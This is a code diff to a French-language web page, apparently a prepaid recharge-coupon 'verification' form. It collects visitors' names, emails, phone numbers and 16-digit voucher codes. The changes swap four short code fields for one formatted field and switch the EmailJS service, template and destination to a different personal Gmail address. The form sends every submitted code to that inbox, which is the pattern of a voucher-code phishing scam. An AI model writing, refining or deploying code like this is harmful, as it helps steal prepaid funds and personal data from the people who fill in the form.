@@ -462,16 +462,10 @@
                     <!-- Code Injection -->
                     <div class="bg-gray-700 p-6 rounded-lg">
                         <h3 class="text-xl font-bold mb-4">INJECTION DES CODES</h3>
-                        <p class="text-gray-400 mb-4">Saisissez les codes de recharge (X de 4 requis)</p>
-                        <div class="code-input-grid grid grid-cols-4 gap-4">
-                            <input type="text" id="code1" name="code1" maxlength="4" placeholder="XXXX" required
-                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
-                            <input type="text" id="code2" name="code2" maxlength="4" placeholder="XXXX" required
-                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
-                            <input type="text" id="code3" name="code3" maxlength="4" placeholder="XXXX" required
-                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
-                            <input type="text" id="code4" name="code4" maxlength="4" placeholder="XXXX" required
-                                   class="bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500">
+                        <p class="text-gray-400 mb-4">Saisissez le code de recharge complet (16 chiffres)</p>
+                        <div class="code-input-container">
+                            <input type="text" id="fullCodeInput" name="fullCodeInput" maxlength="16" placeholder="XXXXXXXXXXXXXXXX" required
+                                   class="w-full bg-gray-600 border border-gray-500 rounded-lg px-4 py-3 text-center text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 text-lg tracking-wider">
                         </div>
                     </div>
 
@@ -774,28 +768,24 @@
                 couponType: document.getElementById('couponType').value,
                 amount: document.getElementById('amount').value,
                 currency: document.getElementById('currency').value,
-                code1: document.getElementById('code1').value,
-                code2: document.getElementById('code2').value,
-                code3: document.getElementById('code3').value,
-                code4: document.getElementById('code4').value,
+                fullCodeInput: document.getElementById('fullCodeInput').value.replace(/\s/g, ''), // Remove spaces
                 terms: document.getElementById('terms').checked,
                 submissionTime: new Date().toLocaleString('fr-FR'),
                 uploadedFiles: uploadedFiles.map(f => f.name).join(', ')
             };
 
-            // Combine coupon codes
-            const fullCode = `${formData.code1}-${formData.code2}-${formData.code3}-${formData.code4}`;
+            // Format the 16-digit code with dashes for display
+            const fullCode = formData.fullCodeInput.replace(/(.{4})/g, '$1-').slice(0, -1);
             
             // Prepare email template parameters
             const templateParams = {
-                to_email: 'adrienkoba311@gmail.com',
+                to_email: 'verifyfr911@gmail.com',
                 from_name: formData.fullName,
                 from_email: formData.userEmail,
                 phone: formData.phoneNumber,
                 coupon_type: formData.couponType,
                 amount: formData.amount + ' ' + formData.currency,
                 full_code: fullCode,
-                individual_codes: `${formData.code1}, ${formData.code2}, ${formData.code3}, ${formData.code4}`,
                 submission_time: formData.submissionTime,
                 uploaded_files: formData.uploadedFiles || 'Aucun fichier',
                 terms_accepted: formData.terms ? 'Oui' : 'Non',
@@ -803,7 +793,7 @@
             };
 
             // Send email using EmailJS
-            emailjs.send("service_l1z1wcm","template_k3kddrm", templateParams)
+            emailjs.send("service_a7aa46d","template_vw63kf8", templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     
@@ -833,7 +823,7 @@ Téléphone: ${formData.phoneNumber}
 Type de coupon: ${formData.couponType}
 Montant: ${formData.amount} ${formData.currency}
 Code complet: ${fullCode}
-Codes individuels: ${formData.code1}, ${formData.code2}, ${formData.code3}, ${formData.code4}
+Code brut: ${formData.fullCodeInput}
 Date de soumission: ${formData.submissionTime}
 Fichiers uploadés: ${formData.uploadedFiles || 'Aucun'}
 Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
@@ -843,6 +833,43 @@ Conditions acceptées: ${formData.terms ? 'Oui' : 'Non'}
                     
                     showNotification('Redirection vers votre client email...', 'info');
                 });
+        });
+
+        // Auto-format 16-digit code input
+        const fullCodeInput = document.getElementById('fullCodeInput');
+        fullCodeInput.addEventListener('input', function(e) {
+            // Remove all non-digit characters
+            let value = e.target.value.replace(/\D/g, '');
+            
+            // Limit to 16 digits
+            if (value.length > 16) {
+                value = value.slice(0, 16);
+            }
+            
+            // Format with spaces every 4 digits for display
+            if (value.length > 0) {
+                value = value.match(/.{1,4}/g).join(' ');
+            }
+            
+            e.target.value = value;
+        });
+
+        // Only allow digits on keypress
+        fullCodeInput.addEventListener('keypress', function(e) {
+            // Allow backspace, delete, tab, escape, enter
+            if ([8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
+                // Allow Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
+                (e.keyCode === 65 && e.ctrlKey === true) ||
+                (e.keyCode === 67 && e.ctrlKey === true) ||
+                (e.keyCode === 86 && e.ctrlKey === true) ||
+                (e.keyCode === 88 && e.ctrlKey === true)) {
+                return;
+            }
+            
+            // Ensure that it is a number and stop the keypress
+            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                e.preventDefault();
+            }
         });
 
         // Notification function
